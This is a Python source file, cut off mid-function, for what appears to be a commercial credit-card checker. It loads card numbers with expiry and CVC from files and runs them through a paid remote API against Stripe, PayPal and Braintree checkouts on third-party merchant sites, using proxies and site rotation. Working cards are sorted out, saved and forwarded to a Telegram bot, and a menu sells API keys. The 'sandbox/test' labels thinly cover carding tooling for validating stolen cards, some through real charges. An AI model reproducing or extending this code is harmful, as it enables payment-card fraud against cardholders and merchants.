#!/usr/bin/env python3

import requests
import os
import json
import random
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
import time
import subprocess
import sys

CONFIG_FILE = "checker_config.json"
SITES_DIR = "sites"
RESULTS_DIR = "results"
DEFAULT_THREADS = 5
VERSION = "v0.2"

checkStats = {
    'total': 0,
    'checked': 0,
    'approved': 0,
    'ccn': 0,
    'live': 0,
    'charged': 0,
    'dead': 0,
    'invalid': 0,
    'approvedCards': [],
    'ccnCards': [],
    'liveCards': [],
    'chargedCards': []
}

class Colors:
    GREEN = '\033[92m'
    RED = '\033[91m'
    ORANGE = '\033[93m'
    GRAY = '\033[90m'
    WHITE = '\033[97m'
    CYAN = '\033[96m'
    RESET = '\033[0m'
    BOLD = '\033[1m'

def initDirectories():
    os.makedirs(SITES_DIR, exist_ok=True)
    os.makedirs(RESULTS_DIR, exist_ok=True)
    
    for gateway in ['stripe', 'stripe_charge', 'ppcp', 'b3', 'b3charge', 
                     'stripe_live_test', 'stripe_charge_live_test', 'ppcp_live_test', 'b3_live_test']:
        filepath = os.path.join(SITES_DIR, f"{gateway}.txt")
        if not os.path.exists(filepath):
            with open(filepath, 'w') as f:
                f.write('')

def installDependencies():
    print(f"{Colors.CYAN}[*] Checking dependencies...{Colors.RESET}")
    
    try:
        import requests
        print(f"{Colors.GREEN}[✓] requests installed{Colors.RESET}")
    except ImportError:
        print(f"{Colors.ORANGE}[!] Installing requests...{Colors.RESET}")
        subprocess.check_call([sys.executable, "-m", "pip", "install", "requests"])
        print(f"{Colors.GREEN}[✓] requests installed{Colors.RESET}")
    
    print(f"{Colors.GREEN}[✓] All dependencies ready!{Colors.RESET}\n")
    time.sleep(1)

def loadConfig():
    if os.path.exists(CONFIG_FILE):
        try:
            with open(CONFIG_FILE, 'r') as f:
                return json.load(f)
        except:
            pass
    return {
        "api_key": "",
        "api_base": "https://api.yourdomain.tld",  # Self-hosted API base (can be changed via Configure Server)
        "bot_token": "",
        "chat_id": "",
        "proxy": "",
        "proxy_enabled": False
    }

def saveConfig(config):
    with open(CONFIG_FILE, 'w') as f:
        json.dump(config, f, indent=2)

def loadSites(gateway):
    filepath = os.path.join(SITES_DIR, f"{gateway}.txt")
    if os.path.exists(filepath):
        with open(filepath, 'r') as f:
            return [line.strip() for line in f if line.strip()]
    return []

def saveSites(gateway, sites):
    filepath = os.path.join(SITES_DIR, f"{gateway}.txt")
    with open(filepath, 'w') as f:
        for site in sites:
            f.write(site + '\n')

def extractDomain(url):
    import re
    url = url.strip()
    url = re.sub(r'^https?://', '', url, flags=re.IGNORECASE)
    url = url.split('/')[0]
    url = url.split('?')[0]
    return url

def clearScreen():
    os.system('clear' if os.name != 'nt' else 'cls')

def printBanner():
    banner = f"""
{Colors.CYAN}░▄▀▀░█▄█▒██▀░▄▀▀░█▄▀░█▄▒▄█▒▄▀▄░▀█▀▒██▀
░▀▄▄▒█▒█░█▄▄░▀▄▄░█▒█░█▒▀▒█░█▀█░▒█▒░█▄▄{Colors.RESET}
{Colors.WHITE}         @isnotsin - {VERSION}{Colors.RESET}
"""
    print(banner)

def printMenu():
    clearScreen()
    printBanner()
    config = loadConfig()
    
    key_status = f"{Colors.GREEN}✓ Set{Colors.RESET}" if config.get('api_key') else f"{Colors.RED}✗ Not Set{Colors.RESET}"
    forwarder_status = f"{Colors.GREEN}✓ Enabled{Colors.RESET}" if config.get('bot_token') and config.get('chat_id') else f"{Colors.GRAY}✗ Disabled{Colors.RESET}"
    proxy_status = f"{Colors.GREEN}✓ Enabled{Colors.RESET}" if config.get('proxy_enabled') else f"{Colors.GRAY}✗ Disabled{Colors.RESET}"
    
    print(f"{Colors.WHITE}[1]{Colors.RESET} START CHECKER")
    print(f"{Colors.WHITE}[2]{Colors.RESET} CONFIGURE API KEY {key_status}")
    print(f"{Colors.WHITE}[3]{Colors.RESET} CONFIGURE SERVER")
    print(f"{Colors.WHITE}[4]{Colors.RESET} CONFIGURE SITES")
    print(f"{Colors.WHITE}[5]{Colors.RESET} CONFIGURE PROXY {proxy_status}")
    print(f"{Colors.WHITE}[6]{Colors.RESET} CONFIGURE FORWARDER {forwarder_status}")
    print(f"{Colors.WHITE}[7]{Colors.RESET} BUY API KEY")
    print(f"{Colors.WHITE}[8]{Colors.RESET} EXIT")
    print()

def getTimestamp():
    return datetime.now().strftime("%H:%M:%S")

def getFileTimestamp():
    return datetime.now().strftime("%Y%m%d_%H%M%S")

def formatCard(card):
    return f"{Colors.WHITE}{card}{Colors.RESET}"

def formatIp(ip):
    return f"{Colors.GRAY}{ip}{Colors.RESET}"

def formatBracket(content, color):
    return f"{Colors.WHITE}[{color}{content}{Colors.RESET}{Colors.WHITE}]{Colors.RESET}"

def printProgress():
    approved = checkStats['approved'] + checkStats['charged']
    live = checkStats['ccn'] + checkStats['live']
    dead = checkStats['dead']
    invalid = checkStats['invalid']
    
    progress = f"{Colors.CYAN}PROGRESS: {checkStats['checked']}/{checkStats['total']}{Colors.RESET}"
    s_count = f"{Colors.GREEN}S: {approved}{Colors.RESET}"
    l_count = f"{Colors.ORANGE}L: {live}{Colors.RESET}"
    d_count = f"{Colors.RED}D: {dead}{Colors.RESET}"
    i_count = f"{Colors.GRAY}I: {invalid}{Colors.RESET}"
    
    status_line = f"{progress} | {s_count} | {l_count} | {d_count} | {i_count}"
    print(f"\r{status_line}", end='', flush=True)

def sendTelegramNotification(config, card, status, code, message):
    if not config.get('bot_token') or not config.get('chat_id'):
        return
    
    if status not in ['APPROVED', 'CCN MATCHED', 'LIVE', 'CHARGED']:
        return
    
    try:
        emoji_map = {
            'CHARGED': '💰',
            'APPROVED': '🎉',
            'CCN MATCHED': '🟢',
            'LIVE': '✅'
        }
        
        emoji = emoji_map.get(status, '📍')
        
        text = f"""
{emoji} <b>{status}</b>

<b>Card:</b> <code>{card}</code>
<b>Code:</b> {code}
<b>Message:</b> {message}

<b>sinno$ – tg: @isnotsin</b>
"""
        
        url = f"https://api.telegram.org/bot{config['bot_token']}/sendMessage"
        payload = {
            'chat_id': config['chat_id'],
            'text': text.strip(),
            'parse_mode': 'HTML'
        }
        requests.post(url, json=payload, timeout=5)
    except:
        pass

def saveToFile(cards, status, timestamp):
    if not cards:
        return
    
    filename = os.path.join(RESULTS_DIR, f"{status.lower().replace(' ', '_')}_{timestamp}.txt")
    
    try:
        with open(filename, 'w') as f:
            for logLine in cards:
                f.write(logLine + '\n')
        print(f"\n{Colors.GREEN}[+] SAVED TO {filename}{Colors.RESET}")
    except Exception as e:
        print(f"\n{Colors.RED}[-] ERROR SAVING FILE: {e}{Colors.RESET}")

def logResult(card, status, code, message, ip, gateway, config, site, siteLabel):
    timestamp = getTimestamp()
    
    statusMap = {
        'APPROVED': ('S', Colors.GREEN),
        'CCN MATCHED': ('L', Colors.ORANGE),
        'LIVE': ('L', Colors.ORANGE),
        'CHARGED': ('S', Colors.GREEN),
        'DEAD': ('D', Colors.RED),
        'ERROR': ('I', Colors.GRAY)
    }
    
    statusChar, statusColor = statusMap.get(status, ('D', Colors.RED))
    
    statusBracket = formatBracket(statusChar, statusColor)
    formattedCard = formatCard(card)
    formattedIp = formatIp(ip)
    
    resultMessage = f"{statusColor}{code.upper()} - {message.upper()}{Colors.RESET}"
    gatewayName = gateway.upper()
    
    logLine = f"{timestamp} : {statusBracket} {formattedCard} | {resultMessage} | {formattedIp} | {gatewayName} | {siteLabel}"
    logLineClean = f"{timestamp} : [{statusChar}] {card} | {code.upper()} - {message.upper()} | {ip} | {gatewayName} | {siteLabel}"
    
    print(f"\r{' ' * 100}\r{logLine}")
    
    checkStats['checked'] += 1
    
    if status == 'APPROVED':
        checkStats['approved'] += 1
        checkStats['approvedCards'].append(logLineClean)
        sendTelegramNotification(config, card, status, code, message)
    elif status == 'CCN MATCHED':
        checkStats['ccn'] += 1
        checkStats['ccnCards'].append(logLineClean)
        sendTelegramNotification(config, card, status, code, message)
    elif status == 'LIVE':
        checkStats['live'] += 1
        checkStats['liveCards'].append(logLineClean)
        sendTelegramNotification(config, card, status, code, message)
    elif status == 'CHARGED':
        checkStats['charged'] += 1
        checkStats['chargedCards'].append(logLineClean)
        sendTelegramNotification(config, card, status, code, message)
    elif status == 'DEAD':
        checkStats['dead'] += 1
    elif status == 'ERROR':
        checkStats['invalid'] += 1
    
    printProgress()

def checkCard(card, site, gateway, config, siteLabel):
    card = card.strip()
    
    if not card or '|' not in card:
        logResult(card, 'ERROR', 'INVALID', 'INVALID CARD FORMAT', 'N/A', gateway, config, site, siteLabel)
        return
    
    api_url = f"{config['api_base']}/{gateway}"
    
    params = {
        'site': site,
        'cards': card,
        'key': config['api_key']
    }
    
    if config.get('proxy_enabled') and config.get('proxy'):
        params['proxy'] = config['proxy']
    
    try:
        response = requests.get(api_url, params=params, timeout=120)
        
        if response.status_code == 401:
            print(f"\n{Colors.RED}[!] API KEY EXPIRED OR INVALID{Colors.RESET}")
            if os.path.exists(CONFIG_FILE):
                config['api_key'] = ""
                saveConfig(config)
            return
        
        data = response.json()
        
        status = data.get('status', 'ERROR')
        code = data.get('code', 'unknown')
        message = data.get('message', 'No message')
        ip = data.get('site_info', {}).get('proxy_ip', 'N/A')
        
        logResult(card, status, code, message, ip, gateway, config, site, siteLabel)
        
    except requests.exceptions.Timeout:
        logResult(card, 'ERROR', 'TIMEOUT', 'REQUEST TIMEOUT', 'N/A', gateway, config, site, siteLabel)
    except requests.exceptions.RequestException as e:
        logResult(card, 'ERROR', 'CONNECTION', 'CONNECTION ERROR', 'N/A', gateway, config, site, siteLabel)
    except Exception as e:
        logResult(card, 'ERROR', 'EXCEPTION', str(e).upper(), 'N/A', gateway, config, site, siteLabel)

def loadCards(files):
    cards = []
    for filePath in files:
        try:
            with open(filePath, 'r') as f:
                for line in f:
                    line = line.strip()
                    if not line:
                        continue
                    
                    card = extractCard(line)
                    if card:
                        cards.append(card)
                        
            print(f"{Colors.GREEN}[+] LOADED {filePath}{Colors.RESET}")
        except FileNotFoundError:
            print(f"{Colors.RED}[-] FILE NOT FOUND: {filePath}{Colors.RESET}")
        except Exception as e:
            print(f"{Colors.RED}[-] ERROR READING {filePath}: {e}{Colors.RESET}")
    return cards

def extractCard(line):
    import re
    
    pattern = r'(\d{13,19})\D*(\d{1,2})\D*(\d{2,4})\D*(\d{3,4})'
    
    match = re.search(pattern, line)
    if match:
        cc = match.group(1)
        mm = match.group(2).zfill(2)
        yy = match.group(3)
        cvc = match.group(4)
        
        if len(yy) == 4:
            yy = yy[2:]
        
        if len(cc) >= 13 and len(cc) <= 19 and int(mm) >= 1 and int(mm) <= 12:
            return f"{cc}|{mm}|{yy}|{cvc}"
    
    return None

def showSites(gateway):
    clearScreen()
    printBanner()
    sites = loadSites(gateway)
    builtin_key = f"SIN-{gateway.upper()}"
    
    print(f"{Colors.CYAN}SITES FOR {gateway.upper()}: (sites/{gateway}.txt){Colors.RESET}\n")
    
    print(f"{Colors.GREEN}[BUILT-IN]{Colors.RESET} {builtin_key} - Random site from server\n")
    
    if not sites:
        print(f"{Colors.GRAY}No custom sites configured.{Colors.RESET}\n")
    else:
        print(f"{Colors.WHITE}CUSTOM SITES:{Colors.RESET}")
        for idx, site in enumerate(sites, 1):
            print(f"{Colors.WHITE}[{idx}]{Colors.RESET} {site}")
        print()

def configureSites():
    clearScreen()
    printBanner()
    print(f"{Colors.CYAN}SELECT GATEWAY TO CONFIGURE:{Colors.RESET}\n")
    print(f"{Colors.WHITE}[1]{Colors.RESET} STRIPE AUTH (SANDBOX/TEST)")
    print(f"{Colors.WHITE}[2]{Colors.RESET} STRIPE CHARGE (SANDBOX/TEST)")
    print(f"{Colors.WHITE}[3]{Colors.RESET} PPCP (SANDBOX/TEST)")
    print(f"{Colors.WHITE}[4]{Colors.RESET} B3 AUTH (SANDBOX/TEST)")
    print(f"{Colors.WHITE}[5]{Colors.RESET} B3 CHARGE (SANDBOX/TEST)")
    print()
    print(f"{Colors.ORANGE}LIVE TEST GATEWAYS:{Colors.RESET}")
    print(f"{Colors.WHITE}[6]{Colors.RESET} STRIPE AUTH (LIVE TEST)")
    print(f"{Colors.WHITE}[7]{Colors.RESET} STRIPE CHARGE (LIVE TEST)")
    print(f"{Colors.WHITE}[8]{Colors.RESET} PPCP LIVE TEST")
    print(f"{Colors.WHITE}[9]{Colors.RESET} B3 LIVE TEST")
    print()
    print(f"{Colors.WHITE}[0]{Colors.RESET} BACK")
    print()
    
    choice = input(f"{Colors.WHITE}CHOOSE: {Colors.RESET}").strip()
    
    gateway_map = {
        '1': 'stripe',
        '2': 'stripe_charge',
        '3': 'ppcp',
        '4': 'b3',
        '5': 'b3charge',
        '6': 'stripe_live_test',
        '7': 'stripe_charge_live_test',
        '8': 'ppcp_live_test',
        '9': 'b3_live_test'
    }
    gateway = gateway_map.get(choice)
    
    if not gateway:
        return
    
    sites = loadSites(gateway)
    showSites(gateway)
    print(f"{Colors.CYAN}[1]{Colors.RESET} ADD SITE MANUALLY")
    print(f"{Colors.CYAN}[2]{Colors.RESET} ADD SITES FROM TXT FILE")
    print(f"{Colors.CYAN}[3]{Colors.RESET} REMOVE SITE")
    print(f"{Colors.CYAN}[4]{Colors.RESET} BACK")
    print()
    
    action = input(f"{Colors.WHITE}CHOOSE: {Colors.RESET}").strip()
    
    if action == '1':
        site = input(f"{Colors.WHITE}ENTER SITE URL: {Colors.RESET}").strip()
        if site:
            clean_site = extractDomain(site)
            sites.append(clean_site)
            saveSites(gateway, sites)
            print(f"{Colors.GREEN}[+] SITE ADDED: {clean_site}{Colors.RESET}")
        time.sleep(1)
    elif action == '2':
        filepath = input(f"{Colors.WHITE}ENTER TXT FILE PATH: {Colors.RESET}").strip()
        try:
            with open(filepath, 'r') as f:
                new_sites = [extractDomain(line.strip()) for line in f if line.strip()]
            sites.extend(new_sites)
            sites = list(set(sites))
            saveSites(gateway, sites)
            print(f"{Colors.GREEN}[+] ADDED {len(new_sites)} SITES{Colors.RESET}")
        except FileNotFoundError:
            print(f"{Colors.RED}[-] FILE NOT FOUND{Colors.RESET}")
        except Exception as e:
            print(f"{Colors.RED}[-] ERROR: {e}{Colors.RESET}")
        time.sleep(1)
    elif action == '3':
        if not sites:
            print(f"{Colors.RED}[-] NO SITES TO REMOVE{Colors.RESET}")
            time.sleep(1)
            return
        showSites(gateway)
        idx = input(f"{Colors.WHITE}SITE NUMBER TO REMOVE: {Colors.RESET}").strip()
        try:
            sites.pop(int(idx) - 1)
            saveSites(gateway, sites)
            print(f"{Colors.GREEN}[+] SITE REMOVED{Colors.RESET}")
        except:
            print(f"{Colors.RED}[-] INVALID INDEX{Colors.RESET}")
        time.sleep(1)

def configureProxy():
    config = loadConfig()
    clearScreen()
    printBanner()
    
    proxy_enabled = config.get('proxy_enabled', False)
    proxy_value = config.get('proxy', '')
    
    status = f"{Colors.GREEN}ENABLED{Colors.RESET}" if proxy_enabled else f"{Colors.RED}DISABLED{Colors.RESET}"
    
    print(f"{Colors.CYAN}PROXY STATUS: {status}{Colors.RESET}")
    if proxy_value:
        print(f"{Colors.CYAN}PROXY: {Colors.WHITE}{proxy_value}{Colors.RESET}\n")
    else:
        print()
    
    print(f"{Colors.WHITE}[1]{Colors.RESET} SET PROXY")
    print(f"{Colors.WHITE}[2]{Colors.RESET} ENABLE/DISABLE PROXY")
    print(f"{Colors.WHITE}[3]{Colors.RESET} REMOVE PROXY")
    print(f"{Colors.WHITE}[4]{Colors.RESET} BACK")
    print()
    
    choice = input(f"{Colors.WHITE}CHOOSE: {Colors.RESET}").strip()
    
    if choice == '1':
        proxy = input(f"{Colors.WHITE}ENTER PROXY (http://user:pass@host:port): {Colors.RESET}").strip()
        if proxy:
            config['proxy'] = proxy
            config['proxy_enabled'] = True
            saveConfig(config)
            print(f"{Colors.GREEN}[+] PROXY SET AND ENABLED{Colors.RESET}")
        time.sleep(1)
    elif choice == '2':
        if config.get('proxy'):
            config['proxy_enabled'] = not config.get('proxy_enabled', False)
            saveConfig(config)
            status = "ENABLED" if config['proxy_enabled'] else "DISABLED"
            print(f"{Colors.GREEN}[+] PROXY {status}{Colors.RESET}")
        else:
            print(f"{Colors.RED}[-] NO PROXY SET{Colors.RESET}")
        time.sleep(1)
    elif choice == '3':
        config['proxy'] = ""
        config['proxy_enabled'] = False
        saveConfig(config)
        print(f"{Colors.GREEN}[+] PROXY REMOVED{Colors.RESET}")
        time.sleep(1)

def configureApiKey():
    config = loadConfig()
    clearScreen()
    printBanner()
    
    current_key = config.get('api_key', '')
    if current_key:
        print(f"{Colors.CYAN}CURRENT KEY: {Colors.WHITE}{current_key}{Colors.RESET}\n")
        
        check_url = f"{config['api_base']}/check?key={current_key}"
        try:
            response = requests.get(check_url, timeout=10)
            data = response.json()
            
            if data.get('valid'):
                info = data.get('info', {})
                days_left = info.get('days_left', 0)
                
                if days_left > 0:
                    print(f"{Colors.GREEN}[✓] KEY VALID - {days_left} DAYS LEFT{Colors.RESET}\n")
                else:
                    print(f"{Colors.RED}[✗] KEY EXPIRED{Colors.RESET}\n")
                    config['api_key'] = ""
                    saveConfig(config)
            else:
                print(f"{Colors.RED}[✗] KEY INVALID{Colors.RESET}\n")
                config['api_key'] = ""
                saveConfig(config)
        except:
            print(f"{Colors.RED}[✗] CANNOT CHECK KEY{Colors.RESET}\n")
    
    print(f"{Colors.WHITE}[1]{Colors.RESET} SET NEW KEY")
    print(f"{Colors.WHITE}[2]{Colors.RESET} REMOVE KEY")
    print(f"{Colors.WHITE}[3]{Colors.RESET} BACK")
    print()
    
    choice = input(f"{Colors.WHITE}CHOOSE: {Colors.RESET}").strip()
    
    if choice == '1':
        key = input(f"{Colors.WHITE}ENTER API KEY: {Colors.RESET}").strip()
        if key:
            config['api_key'] = key
            saveConfig(config)
            print(f"{Colors.GREEN}[+] API KEY SAVED{Colors.RESET}")
        time.sleep(1)
    elif choice == '2':
        config['api_key'] = ""
        saveConfig(config)
        print(f"{Colors.GREEN}[+] API KEY REMOVED{Colors.RESET}")
        time.sleep(1)

def configureServer():
    config = loadConfig()
    clearScreen()
    printBanner()
    print(f"{Colors.CYAN}CURRENT SERVER: {Colors.WHITE}{config.get('api_base', 'N/A')}{Colors.RESET}\n")
    print(f"{Colors.WHITE}[1]{Colors.RESET} SET CUSTOM SERVER")
    print(f"{Colors.WHITE}[2]{Colors.RESET} RESET TO DEFAULT")
    print(f"{Colors.WHITE}[3]{Colors.RESET} BACK")
    print()
    
    choice = input(f"{Colors.WHITE}CHOOSE: {Colors.RESET}").strip()
    
    if choice == '1':
        url = input(f"{Colors.WHITE}ENTER API BASE URL: {Colors.RESET}").strip()
        if url:
            config['api_base'] = url.rstrip('/')
            saveConfig(config)
            print(f"{Colors.GREEN}[+] SERVER SET{Colors.RESET}")
        time.sleep(1)
    elif choice == '2':
        config['api_base'] = "https://api.isnotsin.com"
        saveConfig(config)
        print(f"{Colors.GREEN}[+] SERVER RESET{Colors.RESET}")
        time.sleep(1)

def configureForwarder():
    config = loadConfig()
    clearScreen()
    printBanner()
    
    status = f"{Colors.GREEN}ENABLED{Colors.RESET}" if config.get('bot_token') and config.get('chat_id') else f"{Colors.RED}DISABLED{Colors.RESET}"
    print(f"{Colors.CYAN}FORWARDER STATUS: {status}{Colors.RESET}\n")
    
    if config.get('bot_token'):
        print(f"{Colors.CYAN}BOT TOKEN: {Colors.WHITE}{config['bot_token'][:20]}...{Colors.RESET}")
    if config.get('chat_id'):
        print(f"{Colors.CYAN}CHAT ID: {Colors.WHITE}{config['chat_id']}{Colors.RESET}\n")
    
    print(f"{Colors.WHITE}[1]{Colors.RESET} SET BOT TOKEN")
    print(f"{Colors.WHITE}[2]{Colors.RESET} SET CHAT ID")
    print(f"{Colors.WHITE}[3]{Colors.RESET} REMOVE FORWARDER")
    print(f"{Colors.WHITE}[4]{Colors.RESET} BACK")
    print()
    
    choice = input(f"{Colors.WHITE}CHOOSE: {Colors.RESET}").strip()
    
    if choice == '1':
        token = input(f"{Colors.WHITE}ENTER BOT TOKEN: {Colors.RESET}").strip()
        if token:
            config['bot_token'] = token
            saveConfig(config)
            print(f"{Colors.GREEN}[+] BOT TOKEN SAVED{Colors.RESET}")
        time.sleep(1)
    elif choice == '2':
        chat_id = input(f"{Colors.WHITE}ENTER CHAT ID: {Colors.RESET}").strip()
        if chat_id:
            config['chat_id'] = chat_id
            saveConfig(config)
            print(f"{Colors.GREEN}[+] CHAT ID SAVED{Colors.RESET}")
        time.sleep(1)
    elif choice == '3':
        config['bot_token'] = ""
        config['chat_id'] = ""
        saveConfig(config)
        print(f"{Colors.GREEN}[+] FORWARDER REMOVED{Colors.RESET}")
        time.sleep(1)

def showBuyMenu():
    clearScreen()
    printBanner()
    
    print(f"{Colors.CYAN}{'='*50}{Colors.RESET}")
    print(f"{Colors.WHITE}CHECKMATE API - PRICING{Colors.RESET}")
    print(f"{Colors.CYAN}{'='*50}{Colors.RESET}\n")
    
    print(f"{Colors.WHITE}API KEY OPTIONS:{Colors.RESET}\n")
    
    print(f"{Colors.GREEN}STANDARD KEY (7 DAYS) - $10{Colors.RESET}")
    print(f"  - Full access to all gateways")
    print(f"  - Stripe Auth & Charge")
    print(f"  - PPCP (PayPal Commerce Platform)")
    print(f"  - Braintree Auth & Charge")
    print(f"  - BIN checker included")
    print(f"  - Proxy parameter support")
    print(f"  - Built-in site rotation")
    print(f"  - 100 requests/minute\n")
    
    print(f"{Colors.CYAN}PRIVATE API (30 DAYS) - $15{Colors.RESET}")
    print(f"  - Dedicated API instance")
    print(f"  - All standard features included")
    print(f"  - Higher rate limits (200 req/min)")
    print(f"  - Priority support")
    print(f"  - Not listed on public status page")
    print(f"  - Perfect for building your own tools")
    print(f"  - Custom integrations available\n")
    
    print(f"{Colors.CYAN}{'='*50}{Colors.RESET}")
    print(f"{Colors.WHITE}AVAILABLE GATEWAYS:{Colors.RESET}")
    print(f"{Colors.CYAN}{'='*50}{Colors.RESET}\n")
    
    print(f"{Colors.GREEN}[STRIPE]{Colors.RESET}")
    print(f"  /stripe - Card authorization (no charge)")
    print(f"  /stripe_charge - Full checkout with charge\n")
    
    print(f"{Colors.GREEN}[PPCP]{Colors.RESET}")
    print(f"  /ppcp - PayPal Commerce Platform\n")
    
    print(f"{Colors.GREEN}[BRAINTREE]{Colors.RESET}")
    print(f"  /b3 - Card authorization (no charge)")
    print(f"  /b3charge - Full checkout with charge\n")
    
    print(f"{Colors.GREEN}[EXTRAS]{Colors.RESET}")
    print(f"  /bin - BIN checker (no auth required)\n")
    
    print(f"{Colors.CYAN}{'='*50}{Colors.RESET}")
    print(f"{Colors.WHITE}CONTACT & PAYMENT:{Colors.RESET}")
    print(f"{Colors.CYAN}{'='*50}{Colors.RESET}\n")
    
    print(f"{Colors.WHITE}Telegram:{Colors.RESET} {Colors.CYAN}@isnotsin{Colors.RESET}")
    print(f"{Colors.WHITE}Website:{Colors.RESET} {Colors.CYAN}https://isnotsin.com{Colors.RESET}")
    print(f"{Colors.WHITE}Status:{Colors.RESET} {Colors.CYAN}https://status.isnotsin.com{Colors.RESET}")
    print(f"{Colors.WHITE}Docs:{Colors.RESET} {Colors.CYAN}https://github.com/isnotsin/api.isnotsin.com{Colors.RESET}\n")
    
    print(f"{Colors.WHITE}Payment Methods:{Colors.RESET}")
    print(f"  - Binance (USDT)")
    print(f"  - Gcash")
    print(f"  - Maya\n")
    
    print(f"{Colors.CYAN}{'='*50}{Colors.RESET}\n")
    
    input(f"{Colors.WHITE}Press ENTER to return...{Colors.RESET}")

def resetStats():
    checkStats['total'] = 0
    checkStats['checked'] = 0
    checkStats['approved'] = 0
    checkStats['ccn'] = 0
    checkStats['live'] = 0
    checkStats['charged'] = 0
    checkStats['dead'] = 0
    checkStats['invalid'] = 0
    checkStats['approvedCards'] = []
    checkStats['ccnCards'] = []
    checkStats['liveCards'] = []
    checkStats['chargedCards'] = []

def showSummary():
    print(f"\n\n{Colors.CYAN}{'='*50}{Colors.RESET}")
    print(f"{Colors.CYAN}CHECK SUMMARY{Colors.RESET}")
    print(f"{Colors.CYAN}{'='*50}{Colors.RESET}")
    print(f"{Colors.WHITE}TOTAL CHECKED:{Colors.RESET} {checkStats['total']}")
    print(f"{Colors.GREEN}APPROVED:{Colors.RESET} {checkStats['approved']}")
    print(f"{Colors.GREEN}CHARGED:{Colors.RESET} {checkStats['charged']}")
    print(f"{Colors.ORANGE}CCN MATCHED:{Colors.RESET} {checkStats['ccn']}")
    print(f"{Colors.ORANGE}LIVE:{Colors.RESET} {checkStats['live']}")
    print(f"{Colors.RED}DEAD:{Colors.RESET} {checkStats['dead']}")
    print(f"{Colors.GRAY}INVALID/ERROR:{Colors.RESET} {checkStats['invalid']}")
    print(f"{Colors.CYAN}{'='*50}{Colors.RESET}\n")
    
    timestamp = getFileTimestamp()
    
    if checkStats['approvedCards']:
        saveToFile(checkStats['approvedCards'], 'approved', timestamp)
    
    if checkStats['chargedCards']:
        saveToFile(checkStats['chargedCards'], 'charged', timestamp)
    
    if checkStats['ccnCards']:
        saveToFile(checkStats['ccnCards'], 'ccn', timestamp)
    
    if checkStats['liveCards']:
        saveToFile(checkStats['liveCards'], 'live', timestamp)

def selectGateway():
    clearScreen()
    printBanner()
    print(f"{Colors.CYAN}SELECT GATEWAY:{Colors.RESET}\n")
    print(f"{Colors.WHITE}[1]{Colors.RESET} STRIPE AUTH (SANDBOX/TEST)")
    print(f"{Colors.WHITE}[2]{Colors.RESET} STRIPE CHARGE (SANDBOX/TEST)")
    print(f"{Colors.WHITE}[3]{Colors.RESET} PPCP (SANDBOX/TEST)")
    print(f"{Colors.WHITE}[4]{Colors.RESET} B3 AUTH (SANDBOX/TEST)")
    print(f"{Colors.WHITE}[5]{Colors.RESET} B3 CHARGE (SANDBOX/TEST)")
    print()
    print(f"{Colors.ORANGE}LIVE TEST GATEWAYS:{Colors.RESET}")
    print(f"{Colors.WHITE}[6]{Colors.RESET} STRIPE AUTH (LIVE TEST)    {Colors.ORANGE}(REAL TRANSACTIONS!){Colors.RESET}")
    print(f"{Colors.WHITE}[7]{Colors.RESET} STRIPE CHARGE (LIVE TEST)  {Colors.ORANGE}(REAL TRANSACTIONS!){Colors.RESET}")
    print(f"{Colors.WHITE}[8]{Colors.RESET} PPCP LIVE TEST             {Colors.ORANGE}(REAL TRANSACTIONS!){Colors.RESET}")
    print(f"{Colors.WHITE}[9]{Colors.RESET} B3 LIVE TEST               {Colors.ORANGE}(REAL TRANSACTIONS!){Colors.RESET}")
    print()
    
    choice = input(f"{Colors.WHITE}CHOOSE: {Colors.RESET}").strip()
    
    gateway_map = {
        '1': 'stripe',
        '2': 'stripe_charge',
        '3': 'ppcp',
        '4': 'b3',
        '5': 'b3charge',
        '6': 'stripe_live_test',
        '7': 'stripe_charge_live_test',
        '8': 'ppcp_live_test',
        '9': 'b3_live_test'
    }
    
    return gateway_map.get(choice)

def selectSiteMode(gateway):
    clearScreen()
    printBanner()
    
    sites = loadSites(gateway)
    
    base_gateway_map = {
        'stripe': 'STRIPE',
        'stripe_charge': 'STRIPE',
        'stripe_live_test': 'STRIPE-LIVE',
        'stripe_charge_live_test': 'STRIPE-LIVE',
        'ppcp': 'PPCP',
        'ppcp_live_test': 'PPCP-LIVE',
        'b3': 'B3',
        'b3charge': 'B3',
        'b3_live_test': 'B3-LIVE'
    }
    builtin_base = base_gateway_map.get(gateway, gateway.upper())
    builtin_key = f"SIN-{builtin_base}"
    
    print(f"{Colors.CYAN}SELECT SITE MODE FOR {gateway.upper()}:{Colors.RESET}\n")
    print(f"{Colors.WHITE}[1]{Colors.RESET} USE BUILT-IN SITES {Colors.GREEN}({builtin_key} - Random){Colors.RESET}")
    
    if sites:
        print(f"{Colors.WHITE}[2]{Colors.RESET} USE CUSTOM SITES {Colors.CYAN}({len(sites)} sites - Random){Colors.RESET}")
    else:
        print(f"{Colors.GRAY}[2] USE CUSTOM SITES (No custom sites configured){Colors.RESET}")
    
    print()
    choice = input(f"{Colors.WHITE}CHOOSE: {Colors.RESET}").strip()
    
    if choice == '1':
        return builtin_key, builtin_key
    elif choice == '2':
        if not sites:
            print(f"{Colors.RED}[-] NO CUSTOM SITES CONFIGURED. PLEASE ADD SITES FIRST.{Colors.RESET}")
            time.sleep(2)
            return None, None
        selected_site = random.choice(sites)
        site_index = sites.index(selected_site) + 1
        site_label = f"SITE {site_index}"
        return selected_site, site_label
    else:
        return None, None

def startChecker():
    config = loadConfig()
    
    if not config.get('api_key'):
        print(f"{Colors.RED}[!] NO API KEY SET. CONFIGURE API KEY FIRST.{Colors.RESET}")
        time.sleep(2)
        return
    
    gateway = selectGateway()
    
    if not gateway:
        print(f"{Colors.RED}[-] INVALID GATEWAY{Colors.RESET}")
        time.sleep(2)
        return
    
    # Live gateway confirmation
    live_gateways = {
        'stripe_live_test',
        'stripe_charge_live_test',
        'ppcp_live_test',
        'b3_live_test'
    }
    
    if gateway in live_gateways:
        clearScreen()
        printBanner()
        print(f"{Colors.ORANGE}[!] YOU SELECTED A LIVE TEST GATEWAY{Colors.RESET}")
        print(f"{Colors.ORANGE}[!] REAL TRANSACTIONS WILL BE ATTEMPTED (WITH AUTO-VOID/REFUND IF IMPLEMENTED){Colors.RESET}")
        print()
        confirm = input(f"{Colors.WHITE}TYPE 'LIVE' TO CONFIRM: {Colors.RESET}").strip().upper()
        if confirm != 'LIVE':
            print(f"{Colors.RED}[-] LIVE TEST CANCELED{Colors.RESET}")
            time.sleep(2)
            return
    
    selectedSite, siteLabel = selectSiteMode(gateway)
    
    if not selectedSite:
        print(f"{Colors.RED}[-] INVALID SITE SELECTION{Colors.RESET}")
        time.sleep(2)
        return
    
    resetStats()
    
    clearScreen()
    printBanner()
    
